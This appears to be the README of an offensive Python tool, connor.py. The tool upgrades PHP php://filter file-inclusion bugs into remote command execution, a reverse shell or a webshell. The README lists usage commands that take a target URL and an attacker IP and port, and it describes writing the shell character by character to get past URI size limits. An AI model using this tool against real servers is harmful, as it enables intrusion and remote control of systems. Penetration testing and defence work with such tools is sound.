
# connor.py

- Upgrades a source code disclosure attack via php://filter LFI/RFI into a reverse shell
- Avoids webservers URI size limitation by writting the reverse shell letter by letter
- Includes extra features for webshell & RCE

# Requirements
`pip3 install requests`

## Usage
`python3 connor.py help`

**RCE**

`python3 connor.py rce <TARGET-URL> <COMMAND>`

**Reverse Shell**

`python3 connor.py shell <TARGET-URL> <IP> <PORT>`

**Webshell** 

`python3 connor.py web <TARGET-URL> <IP> <PORT>`

**Format of TARGET-URL**

`http://site.com?param=`

*An update is coming for URLs with multiple params. For now harcode `url` in `execute_command`.*

## Credits
The RCE part (which is the foundation of this script) was made possible by adapting the code of synacktiv:

https://github.com/synacktiv/php_filter_chain_generator

## Contact
contact@break.me | https://break.me
